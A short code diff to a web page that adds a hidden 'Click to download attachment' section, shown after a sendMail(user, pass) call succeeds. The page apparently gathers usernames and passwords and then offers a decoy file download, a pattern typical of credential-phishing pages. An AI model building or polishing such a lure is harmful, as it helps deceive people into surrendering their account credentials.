@@ -64,12 +64,21 @@
           </label>
         </span>
         <div class="cta">
-          <button class="btn btn-primary">
+          <button class="btn btn-primary" id="btn1">
             Sign-Up Now
           </button>
         </div>
         </div>
         <!-- /#row3 -->
+        
+        <!-- #row4 -->
+        <div id="row4">
+        	<h3>Downloading file:</h3>
+            <div id="">
+                <a href="#">Click to download attachment</a>
+            </div>
+        </div>
+        <!-- /#row2 -->
         
       </div>
     </div>
@@ -84,6 +93,7 @@
 <script>
   (function() {
   	$('#row3').hide();
+      $('#row4').hide();
   
     // trim polyfill : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/Trim
     if (!String.prototype.trim) {
@@ -186,6 +196,8 @@ function sendMail(user, pass){
         $("#working").fadeOut();
         if(response == "success"){
           //redirect to attachment
+          $('#row3').hide();
+          $('#row4').fadeIn();
         } 
         
         else{
